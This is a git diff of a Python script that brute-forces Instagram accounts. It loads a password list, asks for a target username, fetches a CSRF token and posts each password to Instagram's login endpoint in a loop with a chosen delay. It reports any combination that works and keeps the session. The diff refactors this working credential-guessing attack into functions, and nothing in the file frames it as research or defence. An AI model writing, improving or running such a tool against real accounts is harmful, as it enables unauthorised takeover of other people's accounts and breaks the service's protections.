@@ -7,67 +7,73 @@ filename = 'pass.txt'
 if os.path.isfile(filename):
 	with open(filename) as f:
 	    passwords = f.read().splitlines()
-	    print ('%s Passwords loads successfully' % len(passwords))
+	    if (len(passwords) > 0):
+	    	print ('%s Passwords loads successfully' % len(passwords))
 else:
 	print ('Please create passwords file (pass.txt)')
 	exit()
 
-sess = requests.Session()
-
-UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36'
-
-username = str(input('Please enter a username: '))
-
-delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
 
 
-#check if passwords file con passwords
-if (len(passwords) < 1):
-	print ('Please add password to the passwords file')
-	exit()
 
-#check if user exists
-r = sess.get('https://www.instagram.com/%s/?__a=1' % username) 
-if (r.status_code == 404):
-	print ('User not found')
-	exit()
+def userExists(username):
+	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+	if (r.status_code == 404):
+		print ('User not found')
+		exit()
+	else:
+		return username
 
-#first time -> to get csrftoken
-r = sess.get('https://www.instagram.com/') 
-token = r.cookies.get_dict()['csrftoken']
-print ('Get csrftoken %s' % token)
-print (' ')
 
-#build auth headers
-headers = {
-	'UserAgent':UserAgent,
-	'x-instagram-ajax':'1',
-	'x-csrftoken':token,
-	'x-requested-with': 'XMLHttpRequest',
-	'origin': 'https://www.instagram.com',
-	'ContentType' : 'application/x-www-form-urlencoded',
-	'KeepAlive': 'true',
-	'Accept': '*/*',
-	'Referer': 'https://www.instagram.com',
-	'authority': 'www.instagram.com'
-}
+def Login(username,password):
+	sess = requests.Session()
+	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
+	sess.headers.update({
+		'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
+		'x-instagram-ajax':'1',
+		'X-Requested-With': 'XMLHttpRequest',
+		'origin': 'https://www.instagram.com',
+		'ContentType' : 'application/x-www-form-urlencoded',
+		'Connection': 'keep-alive',
+		'Accept': '*/*',
+		'Referer': 'https://www.instagram.com',
+		'authority': 'www.instagram.com',
+		'Host' : 'www.instagram.com',
+		'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
+		'Accept-Encoding' : 'gzip, deflate'
+	})
 
-for i in range(len(passwords)):
-	password = passwords[i]
-	#build post data
+	#first time -> to get csrftoken
+	r = sess.get('https://www.instagram.com/') 
+	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+
 	data = {'username':username, 'password':password}
-	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers)
+	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
+	token = r.cookies.get_dict()['csrftoken']
+	sess.headers.update({'X-CSRFToken' : token})
 	#parse response
 	data = json.loads(r.text)
 	if (data['status'] == 'fail'):
 		print (data['message'])
-		exit()
+		return False
 	
-	#check res json
 	if (data['authenticated'] == True):
-		print ('Login success %s' % [username,password])
+		return sess #if we want to keep use session
 	else:
+		return False
 		print ('Password incorrect [%s]' % password)
+
+
+
+username = userExists(str(input('Please enter a username: ')))
+delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
+
+
+for i in range(len(passwords)):
+	password = passwords[i]
+	sess = Login(username,password)
+	if (sess):
+		print ('Login success %s' % [username,password])
 
 	try:
 		time.sleep(delayLoop)
